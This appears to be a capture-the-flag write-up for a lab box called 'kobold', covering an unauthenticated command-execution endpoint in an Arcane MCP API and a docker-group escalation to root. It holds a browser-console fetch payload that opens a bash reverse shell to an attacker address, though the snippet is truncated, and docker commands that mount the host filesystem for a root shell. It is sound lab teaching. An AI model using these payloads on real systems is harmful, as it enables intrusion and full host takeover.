Two surfaces: kobold.htb:3552 (Arcane API) and mcp.kobold.htb — an MCPJam Inspector instance for interacting with the Arcane MCP server. Browsing to http://kobold.htb:3552/api/docs reveals a full Scalar API reference with no authentication required, exposing every available endpoint.

Always read the full API docs when a management interface is exposed. The /api/mcp section is what gives this box away immediately — it describes an endpoint that executes arbitrary commands.

Arcane API Enumeration

The API docs expose Arcane v1.13.0. Checking that version against public CVEs immediately surfaces CVE-2026-23520 — a critical command injection affecting Arcane's updater lifecycle label handling. Reading further through the API docs reveals the more direct attack vector: the /api/mcp/connect endpoint accepts a serverConfig JSON object specifying a command, args, and env — and executes it with no authentication check whatsoever.

Initial Access — Unauthenticated RCE via MCP
CVE-2026-23520

The MCPJam Inspector at https://mcp.kobold.htb is a browser UI that sits in front of the Arcane MCP server backend. Rather than clicking through the UI, we go directly to the underlying /api/mcp/connect endpoint via the browser console. Because we're already on the mcp.kobold.htb origin, a plain fetch() call works with no CORS issues.

Step 2 — Trigger the Reverse Shell

Navigate to https://mcp.kobold.htb, open the developer console with F12, and paste the following — replacing the IP with your tun0 address:

fetch('/api/mcp/connect', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    serverConfig: {
      command: "bash",
      args: ["-c", "bash -i >& /dev/tcp/10.10.X.X/4444 0>&1"],
      env: {}

    serverId: "revshell"

Enumeration as ben

The very first command after landing a shell should always be id. On this box, that single command tells you exactly how you're getting root — no further enumeration tools needed.

ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator),111(docker)

Ben is in the docker group. Confirm the socket is accessible and check what images are already pulled on the host:

ben@kobold:~$ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 Mar 21 19:08 /var/run/docker.sock

ben@kobold:~$ docker images
REPOSITORY                   TAG    IMAGE ID       CREATED        SIZE
mysql                        latest f66b7a288113   6 weeks ago    922MB
privatebin/nginx-fpm-alpine   2.0.2  f5f5564e6731   4 months ago   122MB
How do we know docker is the privesc path? The id output explicitly lists 111(docker) in ben's supplementary groups, and ls -la /var/run/docker.sock confirms the socket is group-owned by docker with read/write permissions. Docker group membership gives full control of the Docker daemon, which runs as root — making it effectively equivalent to a sudo entry. The docker images output seals the deal: privatebin/nginx-fpm-alpine:2.0.2 is already present locally, so no internet access is required for the exploit.

While exploring, /privatebin-data is worth noting — it contains a live PrivateBin instance's data directory with TLS certificates for *.kobold.htb, including the private key readable by the operator group that ben is also in. A rabbit hole for another day — the docker path is the intended route.

Privilege Escalation — Docker Group → Root

Ben is in the docker group but the reverse shell was spawned without it as the active GID — the gid=1001(ben) in the id output confirms this. Use newgrp to switch the active group in the current session without needing a fresh login or SSH session.

ben@kobold:~$ newgrp docker
ben@kobold:~$ id
uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)

Docker socket access is now active. Mount the entire host filesystem into the privatebin/nginx-fpm-alpine:2.0.2 container — already present locally — and chroot into it for a full interactive root shell on the host:

ben@kobold:~$ docker run -it --rm \
  -v /:/hostfs \
  --user root \
  --entrypoint /bin/bash \
  privatebin/nginx-fpm-alpine:2.0.2 \
  -c 'chroot /hostfs /bin/bash'
root@a3f91c2d7b1e:/# id
uid=0(root) gid=0(root) groups=0(root)

Alternatively, read the root flag directly without an interactive shell in a single command:

ben@kobold:~$ docker run -v /:/hostfs --rm --user root \
  --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
root@kobold:~# cat /root/root.txt
🔒 REDACTED

Why This Works

The Docker daemon runs as root and honours all volume mounts specified by users in the docker group. The -v /:/hostfs flag maps the entire host filesystem into the container. Running as root inside the container, chroot /hostfs rebases the process root to that mount — giving a full root shell on the actual host with no sandbox escape, kernel exploit, or SUID binary needed.
